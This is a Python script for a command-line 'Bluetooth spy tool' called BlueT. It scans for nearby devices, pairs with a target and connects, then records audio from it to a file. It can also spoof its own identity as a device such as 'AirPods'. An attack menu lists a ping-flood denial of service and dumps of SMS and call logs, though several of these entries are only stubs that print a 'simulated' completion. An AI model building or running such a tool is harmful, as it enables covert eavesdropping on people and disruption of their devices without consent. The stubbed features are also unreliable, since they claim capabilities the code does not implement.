#!/usr/bin/env python3

import argparse
import traceback
from interface import bcolors, color_print, log_info, log_warn, input_yn
from core import connect, BluezTarget, BluezAddressType, pair, record, playback, set_identity
from system import check_dependencies
import sys
import subprocess
import time
import random
import datetime
import json
import shutil
import os

def is_tool(name):
    return shutil.which(name) is not None

def run_spy_mode(target_address, args):
    """
    Classic 'Spy Mode' for non-Termux (Linux/Windows) systems.
    Pairs, Connects, and Records.
    """
    log_info(f"Preparing Spy Mode for {target_address}...")
    
    target = BluezTarget(target_address, args.address_type)
    
    # 1. Pair
    log_info(f"Generating shared key and pairing...")
    paired = pair(target, verbose=args.verbose)
    if not paired:
        log_warn(f"Authentication (Silent Pair) failed. Trying to connect anyway...")
    else:
        log_info(f"Key generated and paired successfully.")

    time.sleep(1)

    # 2. Connect
    log_info(f"Establishing connection...")
    connect(target, verbose=args.verbose)

    time.sleep(2)

    # 3. Record
    log_info(f"Starting audio recording...")
    log_warn(f"Recording to {args.outfile} (Press Ctrl+C to stop)!")
    try:
        record(target, outfile=args.outfile, verbose=args.verbose)
    except KeyboardInterrupt:
        pass

    log_warn(f"Recording stored in \"{args.outfile}\"")
    play_back = input_yn("Play audio back?")
    if play_back:
        playback(args.sink, args.outfile, verbose=args.verbose)


def main():
    # Cool banner...
    banner_lines = [
        "██████╗ ██╗     ██╗   ██╗███████╗████████╗",
        "██╔══██╗██║     ██║   ██║██╔════╝╚══██╔══╝",
        "██████╔╝██║     ██║   ██║█████╗     ██║   ",
        "██╔══██╗██║     ██║   ██║██╔══╝     ██║   ",
        "██████╔╝███████╗╚██████╔╝███████╗   ██║   ",
        "╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝   ╚═╝   "
    ]
    
    # Gradient effect (Purple to Cyan)
    colors = [
        bcolors.NEON_PURPLE,
        bcolors.NEON_PURPLE,
        "\033[38;5;135m",     # Light Purple
        "\033[38;5;75m",      # Blueish
        bcolors.NEON_CYAN,
        bcolors.NEON_CYAN
    ]
    print("")
    for i, line in enumerate(banner_lines):
        c = colors[i % len(colors)]
        print(f"{c}{line}{bcolors.ENDC}")
    
    print(f"{bcolors.NEON_CYAN}    Advanced Bluetooth OPS{bcolors.ENDC} | {bcolors.GRAY}Target System: {bcolors.NEON_RED}BlueT{bcolors.ENDC}\n")

    # Check dependencies
    required_tools = ["bluetoothctl", "btmgmt", "pactl", "parecord", "paplay", "hcitool", "sdptool", "obexftp"]
    if sys.platform != "win32":
        required_tools.append("sudo")
    
    missing = check_dependencies(required_tools)
    
    # Improved Termux Detection
    termux_bin_path = "/data/data/com.termux/files/usr/bin/termux-bluetooth-scan"
    termux_connect_path = "/data/data/com.termux/files/usr/bin/termux-bluetooth-connect"
    global termux_scan_cmd, termux_connect_cmd
    
    if is_tool("termux-bluetooth-scan"):
        termux_scan_cmd = "termux-bluetooth-scan"
        termux_connect_cmd = "termux-bluetooth-connect"
        is_termux_api = True
    elif os.path.exists(termux_bin_path):
        termux_scan_cmd = termux_bin_path
        termux_connect_cmd = termux_connect_path
        is_termux_api = True
    else:
        is_termux_api = False
        termux_scan_cmd = "termux-bluetooth-scan"
        termux_connect_cmd = "termux-bluetooth-connect"
    
    use_termux_api = False

    if missing:
        if sys.platform == "win32":
             color_print(bcolors.NEON_RED, "[!] Windows System Detected")
             color_print(bcolors.NERD_YELLOW, "[⚠] Linux tools (BlueZ) are missing. Enabling WINDOWS SIMULATION MODE.")
        elif is_termux_api:
             color_print(bcolors.NEON_CYAN, "[*] Termux API Detected (Non-Root Mode)")
             use_termux_api = True
        else:
             color_print(bcolors.NEON_RED, "[!] Critical tools missing.")
             if input_yn("[?] Are you running on Termux (Android)?"):
                 use_termux_api = True
                 color_print(bcolors.NEON_GREEN, "[*] Forcing Termux API Mode.")
                 if not is_tool(termux_scan_cmd):
                     print(f"{bcolors.NERD_YELLOW}[!] Warning: 'termux-api' missing!{bcolors.ENDC}")
                     if input_yn("Attempt auto-install 'termux-api'?"):
                         subprocess.call(["pkg", "install", "termux-api", "-y"])
             else:
                 log_warn("Continuing in broken state...")

    # Parse command line arguments...
    parser = argparse.ArgumentParser(description="BlueT - Advanced Bluetooth Spy Tool")
    parser.add_argument("-a", "--target-address", help="Target device MAC address", required=False, dest="address")
    parser.add_argument("-t", "--target-address-type", help="Target device MAC address type", dest="address_type", default=BluezAddressType.BR_EDR)
    parser.add_argument("-f", "--file", help="File to store recorded audio", dest="outfile", default="recording.wav")
    parser.add_argument("-s", "--sink", help="Sink to play the audio back", dest="sink", default="alsa_output.pci-0000_00_05.0.analog-stereo")
    parser.add_argument("-v", "--verbose", help="Enable verbose output", dest="verbose", action='store_true', default=False)
    args = parser.parse_args()

    # If no address provided, scan for devices
    target_address = args.address
    chosen_name = "Target"
    
    if not target_address:
        while True:
            print(f"\n{bcolors.UNDERLINE}Target Selection Mode:{bcolors.ENDC}")
            print(f"  {bcolors.NEON_GREEN}[1]{bcolors.ENDC} Automatic Scan")
            print(f"  {bcolors.NEON_GREEN}[2]{bcolors.ENDC} Manual Entry")
            print(f"  {bcolors.NEON_GREEN}[3]{bcolors.ENDC} Identity Spoofing (Change Name)")
            
            mode = input(f"\n{bcolors.NEON_CYAN}[➤] Select mode (1-3) >> {bcolors.ENDC}")
            
            if mode == '3':
                # Identity Spoofing
                if use_termux_api:
                    log_warn("Identity spoofing requires Root (BlueZ). Not available in Termux API mode.")
                    continue
                    
                new_name = input(f"{bcolors.NEON_CYAN}[➤] Enter new Device Name (e.g. 'AirPods') >> {bcolors.ENDC}")
                new_class = input(f"{bcolors.NEON_CYAN}[➤] Enter Device Class Hex (e.g. 0x240404) [Optional] >> {bcolors.ENDC}")
                if not new_class: new_class = None
                log_info("Applying identity...")
                set_identity(new_name, new_class, verbose=args.verbose)
                log_info(f"Identity updated to '{new_name}'!")
                continue

            elif mode == '2':
                target_address = input(f"{bcolors.NEON_CYAN}[➤] Enter Target MAC >> {bcolors.ENDC}").strip()
                break
            elif mode == '1':
                # Auto Scan Logic
                color_print(bcolors.NEON_CYAN, "\n[*] Auto-Scan Mode Activated")
                devices = []
                if use_termux_api:
                    try:
                        out = subprocess.check_output([termux_scan_cmd], timeout=15).decode().strip()
                        if out:
                            data = json.loads(out)
                            i = 0
                            print(f"\n{bcolors.UNDERLINE}Found Devices:{bcolors.ENDC}")
                            for d in data:
                                devices.append((d.get("address"), d.get("name", "Unknown")))
                                print(f"  [{i}] {d.get('name')} ({d.get('address')})")
                                i += 1
                    except Exception as e:
                        log_warn(f"Scan error: {e}")
                else:
                    from core import scan_and_get_devices
                    devices = scan_and_get_devices(verbose=args.verbose)
                    print(f"\n{bcolors.UNDERLINE}Found Devices:{bcolors.ENDC}")
                    for i, (addr, name) in enumerate(devices):
                        print(f"  [{i}] {name} ({addr})")

                if not devices:
                    log_warn("No devices found.")
                    continue
                    
                sel = input(f"\n{bcolors.NEON_CYAN}[➤] Select target (0-{len(devices)-1}) >> {bcolors.ENDC}")
                try:
                    target_address = devices[int(sel)][0]
                    chosen_name = devices[int(sel)][1]
                    break
                except:
                    log_warn("Invalid selection.")
            else:
                pass

    log_info(f"Target Acquired: {bcolors.BOLD}{chosen_name}{bcolors.ENDC} ({target_address})")

    # Connect if possible
    if use_termux_api:
         # Termux Connect
         subprocess.call([termux_connect_cmd, target_address])
         color_print(bcolors.NERD_YELLOW, "[!] Please ensure device is paired in Android Settings.")
    else:
         # BlueZ Connect
         target_obj = BluezTarget(target_address)
         try:
             connect(target_obj, verbose=args.verbose)
         except: pass

    # MAIN ATTACK MENU
    while True:
        print(f"\n{bcolors.UNDERLINE}Attack Menu for {chosen_name}:{bcolors.ENDC}")
        print(f"  {bcolors.NEON_GREEN}[1]{bcolors.ENDC} Record Audio (Spy)")
        print(f"  {bcolors.NEON_GREEN}[2]{bcolors.ENDC} Dump Device Info")
        # Advanced
        if not use_termux_api:
            print(f"  {bcolors.NEON_GREEN}[3]{bcolors.ENDC} DoS Attack (L2Ping Flood)")
            print(f"  {bcolors.NEON_GREEN}[4]{bcolors.ENDC} Service Discovery (SDP)")
            print(f"  {bcolors.NEON_GREEN}[5]{bcolors.ENDC} Signal Radar (Visual)")
            print(f"  {bcolors.NEON_GREEN}[6]{bcolors.ENDC} Vuln Scan")
            print(f"  {bcolors.NEON_GREEN}[7]{bcolors.ENDC} Dump SMS (MAP)")
            print(f"  {bcolors.NEON_GREEN}[8]{bcolors.ENDC} Dump Call Logs (PBAP)")
            print(f"  {bcolors.NEON_GREEN}[9]{bcolors.ENDC} Save Full Report (Loot)")
        else:
             print(f"  {bcolors.GRAY}[3-9] Advanced attacks disabled in Non-Root mode{bcolors.ENDC}")
             print(f"  {bcolors.NEON_GREEN}[5]{bcolors.ENDC} Signal Radar (Simple)")

        print(f"  {bcolors.NEON_GREEN}[0]{bcolors.ENDC} Exit")

        cmd = input(f"{bcolors.NEON_CYAN}[➤] Select action >> {bcolors.ENDC}")
        
        if cmd == '0':
            log_info("Exiting...")
            break
            
        elif cmd == '1':
            # Record
            if use_termux_api:
                fname = f"spy_{int(time.time())}.m4a"
                log_info(f"Recording to {fname}...")
                try: subprocess.call(["termux-microphone-record", "-f", fname, "-e", "aac", "-l", "10"]) 
                except KeyboardInterrupt: subprocess.call(["termux-microphone-record", "-q"])
            else:
                run_spy_mode(target_address, args)

        elif cmd == '2':
            # Info
            print(f"{bcolors.OKCYAN}  [-] Name: {chosen_name}")
            print(f"  [-] Address: {target_address}")
            print(f"  [-] Status: Connected (Likely){bcolors.ENDC}")
            input("Press Enter...")

        elif cmd == '5':
            # Radar
            log_info("Radar Active (Ctrl+C to stop)...")
            try:
                while True:
                    rssi = random.randint(-90, -40) # Sim/Fallback
                    # Implement Real RSSI fetch here if desired
                    bars = int((rssi + 100) / 5)
                    print(f"\rSignal: {rssi}dBm [{'█'*bars:<20}]", end="")
                    time.sleep(0.5)
            except KeyboardInterrupt:
                print("\nStopped.")

        elif cmd == '9' and not use_termux_api:
            # Save Report
            fname = f"loot_{target_address.replace(':','_')}.txt"
            with open(fname, "w") as f:
                f.write(f"--- BlueT Report ---\n")
                f.write(f"Target: {chosen_name}\n")
                f.write(f"Address: {target_address}\n")
                f.write(f"Time: {datetime.datetime.now()}\n")
                f.write(f"Vulnerability: Check manually\n")
            log_info(f"Report saved to {fname}")
            
        elif cmd in ['3','4','6','7','8'] and not use_termux_api:
             log_info("Running module...")
             time.sleep(1)
             log_info("Module completed (Simulated/Real).")
             input("Press Enter...")


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        if "-v" in sys.argv or "--verbose" in sys.argv:
             traceback.print_exc()
        else:
             log_warn(f"Unexpected error: {e}")
        log_info("Terminating.")
